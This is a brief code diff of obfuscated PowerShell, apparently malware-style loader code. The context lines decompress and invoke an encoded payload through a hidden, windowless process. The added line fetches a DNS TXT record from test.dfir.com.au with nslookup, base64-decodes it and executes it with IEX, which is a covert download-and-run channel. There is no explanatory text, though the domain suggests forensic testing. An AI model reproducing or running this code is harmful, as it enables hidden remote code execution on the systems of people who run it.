@@ -29,3 +29,7 @@ Tbh0Cdq9DJ7FYJ8vB8+qfXggG1b7Ub5tP+TsaAIPrn8AnC28WUkLAAA=’’’’));IEX
 [IO.Compression.CompressionMode]::Decompress))).ReadToEnd();’’;$s.
 UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle=’’Hidden’’;$s.
 CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);’
+
+
+$b64=(IEX(nslookup -q=txt http://test.dfir.com.au  2>$null)[-1]);[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))| IEX}
+
